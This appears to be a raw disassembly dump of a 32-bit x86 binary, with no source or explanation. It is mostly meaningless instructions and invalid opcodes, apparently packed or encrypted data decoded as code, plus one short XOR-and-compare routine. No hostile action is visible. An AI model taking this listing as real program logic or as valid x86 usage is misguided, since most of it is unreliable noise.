  40f9b9:	stos   DWORD PTR es:[edi],eax
  40f9ba:	pop    edx
  40f9bb:	jne    0x40f991
  40f9bd:	adc    al,0xbd
  40f9bf:	jle    0x40fa3f
  40f9c1:	hlt    
  40f9c2:	jns    0x40fa42
  40f9c4:	jle    0x40fa29
  40f9c6:	fs (bad) 
  40f9c8:	rol    BYTE PTR [esi+0x18],cl
  40f9cb:	ret    0xc75b
  40f9ce:	loopne 0x40f9db
  40f9d0:	pop    ds
  40f9d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9d2:	(bad)  
  40f9d3:	xlat   BYTE PTR ds:[ebx]
  40f9d4:	ret    
  40f9d5:	add    BYTE PTR [ecx-0x29],bl
  40f9d8:	addr16 ss cli 
  40f9db:	dec    esp
  40f9dc:	test   DWORD PTR [edx+0x63ec6974],ecx
  40f9e2:	arpl   WORD PTR [eax+0x1c5af8e0],dx
  40f9e8:	sbb    esi,DWORD PTR [ebx]
  40f9ea:	jae    0x40f99a
  40f9ec:	ss js  0x40f9a0
  40f9ef:	lods   al,BYTE PTR ds:[esi]
  40f9f0:	or     BYTE PTR [ecx+0x7],cl
  40f9f3:	lds    ebx,FWORD PTR [edi]
  40f9f5:	(bad)
  40f9f9:	and    edx,DWORD PTR gs:[esi]
  40f9fc:	call   0xf624:0x8abfd3cb
  40fa03:	mov    ebp,DWORD PTR ds:0x8e60959d
  40fa09:	sub    dl,BYTE PTR [edi-0x79]
  40fa0c:	xor    BYTE PTR [esi],bl
  40fa0e:	out    dx,eax
  40fa0f:	add    eax,0xe117e9dc
  40fa14:	or     ecx,ecx
  40fa16:	push   esp
  40fa17:	pushf  
  40fa18:	out    0xc1,eax
  40fa1a:	outs   dx,BYTE PTR ds:[esi]
  40fa1b:	ficom  DWORD PTR [edi]
  40fa1d:	div    BYTE PTR ds:0xac51af12
  40fa23:	inc    ah
  40fa25:	xor    eax,0xa61dbd0
  40fa2a:	add    eax,0x9dab8d4f
  40fa2f:	test   al,0xab
  40fa31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa32:	mov    esi,0x96dd9188
  40fa37:	(bad)  [eax-0x31]
  40fa3a:	test   DWORD PTR [edi],0x23724936
  40fa40:	ins    BYTE PTR es:[edi],dx
  40fa41:	inc    esi
  40fa42:	(bad)  
  40fa43:	retf   0xe6f7
  40fa46:	hlt    
  40fa47:	shr    BYTE PTR [edi-0x508e4064],1
  40fa4d:	pop    eax
  40fa4e:	mov    BYTE PTR [eax+ecx*8],bh
  40fa51:	mov    al,ds:0x845b9c99
  40fa56:	mov    ebp,0xc602ac9e
  40fa5b:	dec    ecx
  40fa5d:	xchg   BYTE PTR [edx+ecx*8],cl
  40fa60:	inc    ebx
  40fa61:	inc    edi
  40fa62:	adc    dl,bh
  40fa64:	fwait
  40fa65:	push   ecx
  40fa66:	(bad)  
  40fa67:	mov    ah,0xd0
  40fa69:	mov    bl,0x8
  40fa6b:	sahf   
  40fa6c:	shr    BYTE PTR [edx+0x47],0x27
  40fa70:	inc    esp
  40fa71:	enter  0xecf9,0x24
  40fa75:	ins    DWORD PTR es:[edi],dx
  40fa76:	je     0x40fa2a
  40fa78:	mov    ebx,0xef2ed3d8
  40fa7d:	das    
  40fa7e:	retf   
  40fa7f:	lahf   
  40fa80:	push   ecx
  40fa81:	or     eax,0x32d083aa
  40fa86:	push   es
  40fa87:	xchg   edx,eax
  40fa88:	and    DWORD PTR [bp+si-0x1c],0xe755bf85
  40fa90:	cmp    al,0x6
  40fa92:	(bad)  
  40fa93:	jae    0x40fa42
  40fa95:	scas   eax,DWORD PTR es:[edi]
  40fa96:	or     BYTE PTR [edx+0x71],bl
  40fa99:	data16 jae 0x40fadf
  40fa9c:	sahf   
  40fa9d:	sbb    eax,0x5a0997eb
  40faa2:	jbe    0x40fa80
  40faa4:	jns    0x40fb04
  40faa6:	std    
  40faa7:	dec    ebp
  40faa8:	scas   al,BYTE PTR es:[edi]
  40faa9:	loope  0x40fa97
  40faab:	ins    DWORD PTR es:[edi],dx
  40faac:	int    0x69
  40faae:	mov    edi,DWORD PTR ds:0x8f0b277a
  40fab4:	imul   ecx,edi,0x41
  40fab7:	stc    
  40fab8:	cmc    
  40fab9:	bnd je 0x40fa92
  40fabc:	out    dx,eax
  40fabd:	push   eax
  40fabe:	scas   al,BYTE PTR es:[edi]
  40fabf:	adc    DWORD PTR [eax],0x86a53f70
  40fac5:	rep stos DWORD PTR es:[edi],eax
  40fac7:	cmp    al,0x91
  40fac9:	stos   DWORD PTR es:[edi],eax
  40faca:	out    0x18,eax
  40facc:	ins    DWORD PTR es:[edi],dx
  40facd:	xor    eax,0x6105d15b
  40fad2:	jmp    0xf8578bf6
  40fad7:	add    eax,0x9678d8e7
  40fadc:	retf   
  40fadd:	je     0x40faeb
  40fadf:	mov    al,0x2d
  40fae1:	ins    BYTE PTR es:[edi],dx
  40fae2:	add    eax,0x7ad117f3
  40fae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fae8:	(bad)  
  40fae9:	xor    esp,esi
  40faeb:	xchg   edx,eax
  40faec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faed:	add    cl,BYTE PTR ds:0x888e9468
  40faf3:	fs fcom st(7)
  40faf6:	clc    
  40faf7:	bound  edx,QWORD PTR [ebx+0x5b]
  40fafa:	int    0xd1
  40fafc:	(bad)  [esi-0x64]
  40faff:	xchg   esp,eax
  40fb00:	lock sub al,0xfa
  40fb03:	xchg   esi,eax
  40fb04:	push   ebx
  40fb05:	add    al,0xfb
  40fb07:	add    dl,cl
  40fb09:	sub    eax,0x51832ba5
  40fb0e:	mov    ebp,0x87b689c5
  40fb13:	mov    dl,0x75
  40fb15:	mov    BYTE PTR [ecx],ah
  40fb17:	mov    ebx,0xff5c777
  40fb1c:	cmp    BYTE PTR [ebx-0xb],al
  40fb1f:	test   BYTE PTR [ebx+ebp*4],bl
  40fb22:	mov    al,0x7f
  40fb24:	pop    esp
  40fb25:	add    DWORD PTR [esi+eiz*4],0x7b827be1
  40fb2c:	dec    edx
  40fb2d:	gs in  al,dx
  40fb2f:	jg     0x40fb20
  40fb31:	pop    ebp
  40fb32:	sti    
  40fb33:	mov    ah,0x28
  40fb35:	ret    
  40fb36:	mov    bh,0xeb
  40fb38:	test   DWORD PTR [ecx-0x25],ebp
  40fb3b:	or     esi,esp
  40fb3d:	mov    bh,0xf3
  40fb3f:	cs jne 0x40fb56
  40fb42:	pop    ss
  40fb43:	push   ebp
  40fb44:	jecxz  0x40fb2d
  40fb46:	add    DWORD PTR ds:0xcd278ad9,ebp
  40fb4c:	lahf   
  40fb4d:	or     ecx,edx
  40fb4f:	mov    ds:0x4e8aebe0,al
  40fb54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb55:	or     ebx,DWORD PTR [eax+0x3e632ef7]
  40fb5b:	pop    esi
  40fb5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb5d:	dec    edi
  40fb5e:	stos   DWORD PTR es:[edi],eax
  40fb5f:	sahf   
  40fb60:	jo     0x40fb92
  40fb62:	lock fmul st,st(7)
  40fb65:	lahf   
  40fb66:	stc    
  40fb67:	cld    
  40fb68:	dec    ecx
  40fb6a:	xchg   ecx,eax
  40fb6b:	loop   0x40fb07
  40fb6d:	and    al,0x67
  40fb6f:	dec    eax
  40fb70:	mov    cl,bl
  40fb72:	hlt    
  40fb73:	jmp    0x40fb38
  40fb75:	adc    DWORD PTR [ecx-0x3d],eax
  40fb78:	mov    eax,ds:0x6f82faa4
  40fb7d:	ja     0x40fb68
  40fb7f:	hlt    
  40fb80:	pop    esi
  40fb81:	fwait
  40fb82:	mov    bl,BYTE PTR [ecx-0x70]
  40fb85:	repz cwde 
  40fb87:	fisttp WORD PTR [ecx]
  40fb89:	outs   dx,DWORD PTR ds:[esi]
  40fb8a:	jbe    0x40fb91
  40fb8c:	push   eax
  40fb8d:	dec    edi
  40fb8e:	jl     0x40fbc8
  40fb90:	inc    edi
  40fb91:	pop    ebx
  40fb92:	and    eax,0x27a073ae
  40fb97:	inc    edx
  40fb98:	add    DWORD PTR [ecx+0xf],ebp
  40fb9b:	repz sbb esp,ebp
  40fb9e:	sub    BYTE PTR [eax-0xe8ae791],al
  40fba4:	dec    esi
  40fba5:	or     al,0x37
  40fba7:	adc    al,0xfa
  40fba9:	int3   
  40fbaa:	jmp    0x612178f3
  40fbaf:	jb     0x40fb82
  40fbb1:	aad    0xf4
  40fbb3:	mov    ds:0x4fd7f248,al
  40fbb8:	scas   al,BYTE PTR es:[edi]
  40fbb9:	cwde   
  40fbba:	push   cs
  40fbbb:	shl    BYTE PTR [ebp+0x64],cl
  40fbbe:	(bad)  
  40fbbf:	mov    ebx,0x73112012
  40fbc4:	fimul  WORD PTR [eax]
  40fbc6:	call   0x62d1:0xdba80951
  40fbcd:	ds xchg esi,eax
  40fbcf:	push   edx
  40fbd0:	xor    DWORD PTR [ebx-0x5d852e4],eax
  40fbd6:	cmp    al,0xda
  40fbd8:	cli    
  40fbd9:	int    0xab
  40fbdb:	dec    edi
  40fbdc:	mov    ds:0x73da9c16,eax
  40fbe1:	loop   0x40fb68
  40fbe3:	je     0x40fbac
  40fbe5:	lods   eax,DWORD PTR ds:[esi]
  40fbe6:	data16 js 0x40fbf3
  40fbe9:	fistp  WORD PTR [eax]
  40fbeb:	or     ebx,esp
  40fbed:	loopne 0x40fbfd
  40fbef:	sbb    DWORD PTR [esi+0x2f],0x6bd03318
  40fbf6:	xor    cl,BYTE PTR [edi+0x57]
  40fbf9:	xchg   esp,eax
  40fbfa:	icebp  
  40fbfb:	mov    ecx,DWORD PTR [eax+0x3c]
  40fbfe:	jmp    0x4501b86
  40fc03:	pop    es
  40fc04:	out    0xb2,al
  40fc06:	jg     0x40fba7
  40fc08:	ja     0x40fba9
  40fc0a:	inc    edx
  40fc0b:	mov    ds:0xc9977c28,al
  40fc11:	mov    ecx,0xceba017c
  40fc16:	fstp   TBYTE PTR [ebp-0x79]
  40fc19:	push   ebp
  40fc1a:	stos   DWORD PTR es:[edi],eax
  40fc1b:	(bad)  
  40fc1c:	scas   al,BYTE PTR es:[edi]
  40fc1d:	mov    ds:0xc7a807d0,eax
  40fc22:	test   BYTE PTR [edx+0x36],dl
  40fc25:	adc    dh,ah
  40fc27:	pop    ss
  40fc28:	hlt    
  40fc29:	jg     0x40fbff
  40fc2b:	dec    ebx
  40fc2c:	call   0xd44:0x8f35a19e
  40fc33:	mov    ds:0xce32e833,eax
  40fc38:	add    esi,DWORD PTR [esi-0x77]
  40fc3b:	fcom   QWORD PTR [edi+0x19]
  40fc3e:	mov    edx,gs
  40fc40:	dec    eax
  40fc41:	jbe    0x40fcb0
  40fc43:	imul   ebx,DWORD PTR [eax],0xffffffb7
  40fc46:	fwait
  40fc47:	out    0x7e,al
  40fc49:	cmp    eax,0xbf34a4d2
  40fc4e:	pop    eax
  40fc4f:	mov    dh,0xc2
  40fc51:	and    ebx,DWORD PTR [ebx]
  40fc53:	ss add bl,0x83
  40fc57:	sbb    ecx,DWORD PTR [esi+0x5de74b5a]
  40fc5d:	call   0xe9a05765
  40fc62:	mov    ah,0x32
  40fc64:	cmc    
  40fc65:	pop    edi
  40fc66:	fldenv [ebx+0x36adad2f]
  40fc6c:	bound  esp,QWORD PTR [edx+0x36765066]
  40fc72:	sbb    al,0x45
  40fc74:	mov    ch,0x22
  40fc76:	out    dx,eax
  40fc77:	pop    ss
  40fc78:	sub    eax,0xb8580d55
  40fc7d:	test   eax,0x16871732
  40fc82:	test   BYTE PTR [ebx],bl
  40fc84:	sar    esp,cl
  40fc86:	cmp    DWORD PTR ds:0x9586f703,ebx
  40fc8c:	fisttp WORD PTR [edi]
  40fc8e:	popf   
  40fc8f:	mov    ch,0xf2
  40fc91:	mov    al,0xd2
  40fc93:	(bad)  
  40fc94:	adc    eax,0xa497123e
  40fc99:	mov    ch,0xc4
  40fc9b:	aas    
  40fc9c:	jmp    0x40fca2
  40fc9e:	jmp    0x40fc89
  40fca0:	and    DWORD PTR [ecx+0x1c],esp
  40fca3:	xlat   BYTE PTR ds:[ebx]
  40fca4:	dec    ebx
  40fca5:	xor    ch,BYTE PTR [ecx-0x6a]
  40fca8:	nop
  40fca9:	pop    esi
  40fcaa:	xchg   esp,eax
  40fcab:	jb     0x40fc5e
  40fcad:	test   BYTE PTR [edi-0x25],ch
  40fcb0:	(bad)  
  40fcb2:	mov    ds:0xdcebbc47,al
  40fcb7:	rcl    DWORD PTR [ebx],0x48
  40fcba:	(bad)  
  40fcbb:	or     edx,DWORD PTR [esp+ecx*8]
  40fcbe:	test   DWORD PTR [esi-0x3e],edi
  40fcc1:	popf   
  40fcc2:	sbb    eax,0x9bdf8ebd
  40fcc7:	outs   dx,DWORD PTR ds:[esi]
  40fcc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcc9:	sbb    ch,BYTE PTR [ebp+0x19]
  40fccc:	ja     0x40fc56
  40fcce:	cmp    BYTE PTR [esi],cl
  40fcd0:	pop    ss
  40fcd1:	and    eax,0xc6397959
  40fcd6:	xor    eax,DWORD PTR [edi+edx*4]
  40fcd9:	xchg   esi,eax
  40fcda:	cli    
  40fcdb:	sbb    BYTE PTR [edx-0x5e],0xae
  40fcdf:	xor    eax,0x2a8a9813
  40fce4:	inc    edx
  40fce5:	and    eax,0x6fd2755c
  40fcea:	mov    ecx,0x5d1d7b7c
  40fcef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcf0:	push   ecx
  40fcf1:	dec    eax
  40fcf2:	mov    WORD PTR [eax+0x391c6212],gs
  40fcf8:	lods   eax,DWORD PTR ds:[esi]
  40fcf9:	xchg   ecx,eax
  40fcfa:	jne    0x40fcd5
  40fcfc:	and    esp,eax
  40fcfe:	dec    ebx
  40fcff:	scas   al,BYTE PTR es:[edi]
  40fd00:	or     esi,DWORD PTR [edi]
  40fd02:	std    
  40fd03:	popf   
  40fd04:	jo     0x40fd81
  40fd06:	xchg   esi,eax
  40fd07:	imul   ecx,DWORD PTR [edx],0xa3b9051e
  40fd0d:	ffree  st(2)
  40fd0f:	test   DWORD PTR [edi-0x47],edi
  40fd12:	mov    es,WORD PTR [edi+ebx*8]
  40fd15:	in     al,0x50
  40fd17:	add    al,0xa
  40fd19:	lahf   
  40fd1a:	xchg   ebp,ebx
  40fd1c:	inc    esi
  40fd1d:	inc    eax
  40fd1e:	enter  0x831d,0xf5
  40fd22:	xchg   ebx,eax
  40fd23:	popf   
  40fd24:	dec    DWORD PTR [ebx+0x493b609a]
  40fd2a:	adc    eax,DWORD PTR [edx]
  40fd2c:	enter  0x508c,0x84
  40fd30:	mov    ecx,0xba3a7efa
  40fd35:	fs dec ebx
  40fd37:	in     eax,dx
  40fd38:	adc    al,0xf
  40fd3a:	mov    ds:0xc4ae8,eax
  40fd3f:	add    BYTE PTR [ebx+0x414afe0d],cl
  40fd45:	add    BYTE PTR [ebx+0x1cc89],cl
  40fd4b:	add    BYTE PTR [ecx-0x7ba74ff],cl
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	or     BYTE PTR [ecx],al
  40fd9e:	and    ch,BYTE PTR [eax]
  40fda0:	cmp    BYTE PTR [eax+0x79f47e7e],0x7e
  40fda7:	jle    0x40fdd7
  40fda9:	test   BYTE PTR [ebx-0x13],0xef
  40fdad:	int3   
  40fdae:	sbb    bh,dl
  40fdb0:	and    eax,0x24fb1bd7
  40fdb5:	push   eax
  40fdb6:	or     al,0xf
  40fdb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdb9:	pusha  
  40fdba:	into   
  40fdbb:	mov    ebx,DWORD PTR [ebp-0x4fd93bf2]
  40fdc1:	or     edi,DWORD PTR [edx-0x3f]
  40fdc4:	test   bl,cl
  40fdc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdc7:	inc    eax
  40fdc8:	sbb    al,0xf6
  40fdca:	loopne 0x40fe45
  40fdcc:	popa   
  40fdcd:	mov    bh,0xa7
  40fdcf:	or     dh,BYTE PTR [ecx+0x5bf08331]
  40fdd5:	and    bl,dl
  40fdd7:	ins    BYTE PTR es:[edi],dx
  40fdd8:	loope  0x40fe09
  40fdda:	test   al,0x83
  40fddc:	mov    ah,0xa9
  40fdde:	ins    BYTE PTR es:[edi],dx
  40fddf:	rcr    bl,cl
  40fde1:	iret   
  40fde2:	xchg   esp,eax
  40fde3:	stc    
  40fde4:	int    0x5e
  40fde6:	mov    esp,0x30f4e2f7
  40fdeb:	fsub   st(0),st
  40fded:	lds    edx,FWORD PTR [ebx]
  40fdef:	xchg   esi,eax
  40fdf0:	inc    eax
  40fdf1:	cmp    DWORD PTR [esi-0x7d52a074],ebx
  40fdf7:	lods   eax,DWORD PTR ds:[esi]
  40fdf8:	dec    eax
  40fdf9:	xor    DWORD PTR [esi+0x1c073761],ebx
  40fdff:	jmp    0xb26b:0xae34b13c
  40fe06:	sub    bh,BYTE PTR [ecx]
  40fe08:	je     0x40fe66
  40fe0a:	xchg   ebx,eax
  40fe0b:	leave  
  40fe0c:	inc    ecx
  40fe0d:	mov    ah,0xd9
  40fe0f:	addr16 mov ebp,0x2ca0577b
  40fe15:	sub    DWORD PTR [esi],esp
  40fe17:	xchg   BYTE PTR [ebp+0x11cbf43d],bl
  40fe1d:	call   0x6a37:0x4bb15111
  40fe24:	xlat   BYTE PTR ds:[ebx]
  40fe25:	lods   eax,DWORD PTR ds:[esi]
  40fe26:	push   0x25
  40fe28:	cmp    eax,esp
  40fe2a:	add    al,0x65
  40fe2c:	add    DWORD PTR [ecx],edi
  40fe2e:	ss push cs
  40fe30:	mov    eax,ds:0xb0916cb6
  40fe35:	and    al,0x93
  40fe37:	test   al,0x52
  40fe39:	push   ss
  40fe3a:	xchg   ecx,eax
  40fe3b:	mov    bh,0x6c
  40fe3d:	fucomi st,st(1)
  40fe40:	test   eax,0xb40d077b
  40fe45:	jecxz  0x40fdca
  40fe47:	fidivr WORD PTR [edx]
  40fe49:	adc    al,0xc4
  40fe4b:	xor    esp,0xffffffc2
  40fe4e:	mov    dh,0x85
  40fe50:	lea    edx,[edi+0x1f]
  40fe53:	xchg   ecx,eax
  40fe54:	dec    edi
  40fe55:	stos   BYTE PTR es:[edi],al
  40fe56:	hlt    
  40fe57:	sub    al,0xa0
  40fe59:	in     al,0x9c
  40fe5b:	dec    esi
  40fe5c:	xlat   BYTE PTR ds:[ebx]
  40fe5d:	inc    edx
  40fe5e:	cwde   
  40fe5f:	mov    ss,WORD PTR [ecx]
  40fe61:	cmp    ch,BYTE PTR [ebx+0x23327d85]
  40fe67:	aaa    
  40fe68:	mov    al,es:0xe55d6ed9
  40fe6e:	bound  esp,QWORD PTR ds:0x9238bed0
  40fe74:	jb     0x40feb9
  40fe76:	sti    
  40fe77:	mov    DWORD PTR [edx+0x6ba63925],esi
  40fe7d:	ret    0x8bb0
  40fe80:	scas   al,BYTE PTR es:[edi]
  40fe81:	cmp    BYTE PTR [ebp+0x7b],0x3e
  40fe85:	out    dx,al
  40fe86:	xchg   edi,eax
  40fe87:	(bad)  
  40fe88:	lods   al,BYTE PTR ds:[esi]
  40fe89:	push   esi
  40fe8a:	jg     0x40fec3
  40fe8c:	pop    ebx
  40fe8d:	pop    ss
  40fe8e:	push   0xa56e92a9
  40fe93:	out    dx,al
  40fe94:	inc    ch
  40fe96:	cld    
  40fe97:	into   
  40fe98:	pop    ds
  40fe99:	push   0xd71b7ec1
  40fe9e:	add    DWORD PTR [esi+0x46],esp
  40fea1:	dec    esi
  40fea2:	push   edx
  40fea3:	xchg   edx,eax
  40fea4:	div    BYTE PTR [eax+0x12]
  40fea7:	sub    al,0xbc
  40fea9:	inc    ebp
  40feaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feab:	outs   dx,DWORD PTR ds:[esi]
  40feac:	pop    edx
  40fead:	sbb    dl,cl
  40feaf:	inc    ecx
  40feb0:	fwait
  40feb1:	xor    DWORD PTR [esi+eax*2-0x5e],esi
  40feb5:	jmp    0x40fe57
  40feb7:	mov    ch,0x1e
  40feb9:	out    dx,eax
  40feba:	inc    ecx
  40febb:	ret    
  40febc:	push   es
  40febd:	in     eax,dx
  40febe:	int    0x12
  40fec0:	sahf   
  40fec1:	loopne 0x40ff37
  40fec3:	push   es
  40fec4:	sub    bl,BYTE PTR [ebx+0x44]
  40fec7:	jmp    0x8685f1f2
  40fecc:	mov    esi,0x738ff3de
  40fed1:	sbb    al,0x10
  40fed3:	stc    
  40fed4:	xchg   edi,eax
  40fed5:	adc    al,BYTE PTR [eax-0x16]
  40fed8:	cmp    BYTE PTR [ebx-0x3ae67049],ch
  40fede:	and    esp,DWORD PTR [eax]
  40fee0:	cs je  0x40fe7d
  40fee3:	sub    bl,dl
  40fee5:	or     eax,0x65faa3c5
  40feea:	and    DWORD PTR [ebx+0x4],ebx
  40feed:	xchg   BYTE PTR [ebx-0x32],dh
  40fef0:	cmp    dl,dl
  40fef2:	rol    BYTE PTR [ebx],0x60
  40fef5:	gs push 0x63
  40fef8:	je     0x40ff6f
  40fefa:	pop    ds
  40fefb:	adc    eax,0x8aa4c03
  40ff00:	loop   0x40fe97
  40ff02:	cdq    
  40ff03:	jmp    0x40ff29
  40ff05:	std    
  40ff06:	bound  esp,QWORD PTR [edi+0x75]
  40ff09:	out    dx,al
  40ff0a:	jge    0x40fee3
  40ff0c:	or     DWORD PTR [esp-0x6b],ebx
  40ff10:	cwde   
  40ff11:	push   ecx
  40ff12:	js     0x40ff32
  40ff14:	adc    al,0xf
  40ff17:	push   eax
  40ff18:	outs   dx,DWORD PTR ds:[esi]
  40ff19:	and    BYTE PTR ds:[ecx+0x7f8cfb6d],al
  40ff20:	or     BYTE PTR es:[ebx+0x701cbfa],0x4a
  40ff28:	test   ebp,esp
  40ff2a:	inc    edi
  40ff2b:	das    
  40ff2c:	rcl    bl,0x9e
  40ff2f:	or     dh,ah
  40ff31:	clc    
  40ff32:	bound  ebp,QWORD PTR [eax-0x77a1ff2e]
  40ff38:	push   es
  40ff39:	push   esp
  40ff3a:	jne    0x40ff5d
  40ff3c:	js     0x40ff0a
  40ff3e:	xchg   ecx,eax
  40ff3f:	rcr    esi,1
  40ff41:	push   edx
  40ff42:	xchg   edi,eax
  40ff43:	test   al,0x3a
  40ff45:	pop    edx
  40ff46:	cld    
  40ff47:	inc    ecx
  40ff48:	and    al,bl
  40ff4a:	dec    edx
  40ff4b:	imul   ebp,DWORD PTR [edi+esi*1+0x53],0xd3fe20b5
  40ff53:	or     al,0x91
  40ff55:	sahf   
  40ff56:	and    BYTE PTR [eax-0x1d85063e],0x9c
  40ff5d:	pop    esp
  40ff5e:	std    
  40ff5f:	cmp    eax,0x9ef8f3e9
  40ff64:	jbe    0x40ff8e
  40ff66:	fwait
  40ff67:	pop    ds
  40ff68:	mov    eax,0xe8927afa
  40ff6d:	mov    esp,0x45f10a97
  40ff72:	test   BYTE PTR [esi+0x4540af28],0xa8
  40ff79:	cdq    
  40ff7a:	sahf   
  40ff7b:	sub    BYTE PTR [ecx],0xa6
  40ff7e:	mov    cl,0x59
  40ff80:	xor    BYTE PTR [esi-0x4f],dl
  40ff83:	jne    0x40ffb9
  40ff85:	and    DWORD PTR [edi],esi
  40ff87:	mov    ebp,0x39fb160a
  40ff8c:	push   ds
  40ff8d:	sbb    dl,BYTE PTR [ebx]
  40ff8f:	test   eax,0x4892a35f
  40ff94:	enter  0xa93,0x4c
  40ff98:	adc    ah,BYTE PTR [eax]
  40ff9a:	mov    esp,0x275446e3
  40ff9f:	or     DWORD PTR [ecx],0xffffff8d
  40ffa2:	dec    ecx
  40ffa3:	(bad)  
  40ffa4:	mov    esi,0x4e127aa3
  40ffa9:	popa   
  40ffaa:	out    dx,al
  40ffab:	inc    edi
  40ffac:	sub    eax,0x9650fd85
  40ffb1:	xor    esp,DWORD PTR [esi]
  40ffb3:	hlt    
  40ffb4:	iret   
  40ffb5:	xor    al,0xb8
  40ffb7:	jge    0x40ff91
  40ffb9:	mov    BYTE PTR [ecx-0x4871fc2e],bh
  40ffbf:	add    ah,dh
  40ffc1:	sub    al,0xea
  40ffc3:	xor    BYTE PTR [ecx-0x52],dl
  40ffc6:	out    dx,al
  40ffc7:	add    BYTE PTR [edi+0x5f],ch
  40ffca:	mov    ds:0x7125ec1a,eax
  40ffcf:	or     edi,DWORD PTR [ecx-0x6ff60423]
  40ffd5:	fisttp DWORD PTR ds:0x3789c130
  40ffdb:	push   0x532bfae3
  40ffe0:	mov    esp,0x67c82a54
  40ffe5:	fwait
  40ffe6:	cmp    al,0xdd
  40ffe8:	call   0x4d8d:0x214be004
  40ffef:	adc    bh,cl
  40fff1:	pop    eax
  40fff2:	outs   dx,DWORD PTR ds:[esi]
  40fff3:	xchg   esp,eax
  40fff4:	out    0x33,eax
  40fff6:	jno    0x410031
  40fff8:	mov    eax,ds:0x97cddd34
  40fffd:	call   0x2442:0x4bb6920a
  410004:	lods   eax,DWORD PTR ds:[esi]
  410005:	push   esp
  410006:	test   ch,al
  410008:	ret    
  410009:	or     bh,dl
  41000b:	pop    eax
  41000c:	stc    
  41000d:	adc    eax,0xf3f86a3a
  410012:	xchg   edi,eax
  410013:	push   0x860c1ca7
  410018:	icebp  
  410019:	cmp    DWORD PTR [ecx],eax
  41001b:	mov    ds:0xaa8a15e9,eax
  410020:	pop    ebx
  410021:	mov    eax,0x3fb6d092
  410026:	mov    dl,0xea
  410028:	stos   BYTE PTR es:[edi],al
  410029:	xlat   BYTE PTR ds:[ebx]
  41002a:	fstp   QWORD PTR [ebp-0x4fb3b866]
  410030:	cmovp  ebx,DWORD PTR [ebx+eiz*4]
  410034:	out    0x32,eax
  410036:	ret    
  410037:	or     BYTE PTR [ebp+0x76],bh
  41003a:	xor    BYTE PTR [esi-0x7b],dl
  41003d:	push   ecx
  41003e:	mov    esi,esi
  410040:	clc    
  410041:	in     eax,0xf2
  410043:	pusha  
  410044:	mov    ds:0xc47f8320,al
  410049:	cvtps2pd xmm5,xmm3
  41004c:	(bad)  [ebp-0x9]
  41004f:	test   DWORD PTR [edx+0x325b9a0a],eax
  410055:	mov    esi,0x5e43fcc9
  41005a:	hlt    
  41005b:	jp     0x41006e
  41005d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41005e:	fisttp QWORD PTR [edi-0x37ea3bfc]
  410064:	shl    ecx,cl
  410066:	retf   0x2afb
  410069:	dec    edx
  41006a:	pusha  
  41006b:	push   ds
  41006c:	repz push ecx
  41006e:	fistp  WORD PTR [esi+0xd]
  410071:	jo     0x410016
  410073:	ficom  WORD PTR [edi-0x4397e984]
  410079:	mov    bl,0x26
  41007b:	ja     0x41004d
  41007d:	mov    bl,0xe9
  41007f:	call   0x8559c5b0
  410084:	ret    
  410085:	arpl   sp,bx
  410087:	cmp    al,0xe6
  410089:	add    al,0x1d
  41008b:	les    edx,FWORD PTR [ecx-0x1c30ed93]
  410091:	inc    ebp
  410092:	pop    esp
  410093:	lea    edx,[eax]
  410095:	fbstp  TBYTE PTR [esi]
  410097:	shl    WORD PTR ds:[eax],0xac
  41009c:	jne    0x4100cf
  41009e:	(bad)  
  4100a0:	mov    edi,0x848b698
  4100a5:	add    DWORD PTR ds:0xa8db7db4,edx
  4100ab:	(bad)  
  4100ac:	sbb    dl,cl
  4100ae:	push   DWORD PTR [ecx-0x68]
  4100b1:	es mov eax,0xd832f490
  4100b7:	dec    edx
  4100b8:	arpl   di,bx
  4100ba:	push   0x7f782b4e
  4100bf:	adc    BYTE PTR [edx+0x40],0xa1
  4100c3:	fwait
  4100c4:	add    BYTE PTR [edi-0x6e],0x5a
  4100c8:	push   edi
  4100c9:	or     al,0xfa
  4100cb:	mov    ch,0x42
  4100cd:	push   ss
  4100ce:	push   eax
  4100cf:	pushf  
  4100d0:	mov    dl,0x89
  4100d2:	cmp    BYTE PTR [eax],ch
  4100d4:	sbb    al,0xc0
  4100d6:	sub    BYTE PTR ss:[ecx],ah
  4100d9:	loopne 0x41007f
  4100db:	int3   
  4100dc:	or     esp,DWORD PTR [edi-0x298539d]
  4100e2:	ret    0xdb14
  4100e5:	adc    ebp,DWORD PTR [ebp+0x79]
  4100e8:	popa   
  4100e9:	out    dx,eax
  4100ea:	mov    DWORD PTR ss:[edi-0x70],esi
  4100ee:	mov    cl,0xa1
  4100f0:	je     0x4100ec
  4100f2:	jge    0x410122
  4100f4:	das    
  4100f5:	pop    ds
  4100f6:	icebp  
  4100f7:	test   eax,0xca19eac9
  4100fc:	(bad)  
  4100fd:	leave  
  4100fe:	stos   BYTE PTR es:[edi],al
  4100ff:	mov    eax,DWORD PTR [ebx]
